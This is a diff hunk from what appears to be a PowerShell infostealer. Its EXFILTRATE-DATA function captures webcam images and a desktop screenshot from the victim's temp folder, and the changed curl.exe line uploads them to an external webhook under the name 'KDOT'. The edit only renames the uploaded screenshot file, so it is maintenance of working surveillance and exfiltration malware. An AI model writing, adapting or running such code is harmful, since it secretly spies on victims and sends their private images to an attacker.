@@ -387,7 +387,7 @@ function EXFILTRATE-DATA {
 
     Get-WebCamImage
 
-    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\out0.jpg\`"" $webhook | out-null
+    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null
 
     $items = Get-ChildItem -Path $env:localappdata\temp\ -Filter out*.jpg
     foreach ($item in $items) {
